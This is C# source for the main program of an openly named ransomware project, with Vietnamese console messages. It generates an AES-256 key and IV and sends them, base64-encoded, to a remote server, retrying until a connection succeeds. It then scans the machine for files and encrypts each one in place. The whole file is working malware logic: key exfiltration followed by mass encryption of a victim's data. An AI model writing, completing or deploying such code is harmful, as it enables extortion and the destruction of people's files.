// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using Ransomware.Sources.Application;
class Program
{
    static void Main()
    {
        bool connected = false;

        var aes = new AesCipher(256);
        var network = new NetworkClient();
        var fileExplorer = new FileExplorer(aes);

        while (!connected)
        {
            connected = network.Connect();

            if (connected)
            {
                string message = Convert.ToBase64String(aes.Key) + "|" + Convert.ToBase64String(aes.IV);
                network.SendData(message);
                network.Disconnect();
            }
            else
            {
                Console.WriteLine("Kết nối thất bại. Đang thử lại...");
                Thread.Sleep(1000); // Đợi 2 giây trước khi thử lại
            }
        }

        var fileDetails = fileExplorer.Scan(1024 * 1024, FileExplorer.SortOrder.Descending);

        Console.WriteLine($"Số lượng file cụ thể được lưu: {fileDetails.Count}");


        foreach (var fileDetail in fileDetails)
        {
            Console.WriteLine($"{fileDetail.FilePath} - {fileDetail.FormatSize()}");
            fileExplorer.EncryptFile(fileDetail.FilePath, fileDetail.Size);
        }
    }
}